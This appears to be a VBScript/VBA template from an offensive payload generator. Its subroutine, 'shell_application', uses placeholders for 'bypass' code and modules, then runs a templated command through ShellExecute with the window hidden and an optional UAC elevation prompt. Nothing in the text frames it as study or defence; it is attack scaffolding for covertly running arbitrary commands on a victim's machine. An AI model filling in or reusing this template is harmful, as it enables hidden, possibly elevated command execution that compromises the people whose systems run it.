
{{bypassCode}}
{{moduleCode}}

Sub shell_application
{{bypassCalls}}
{{moduleCalls}}
    Dim obj3
    Set obj3 = GetObject("{{runmode}}")
    obj3.ShellExecute "{{command}}", "", "", "{{UAC_Prompt}}", 0

End Sub
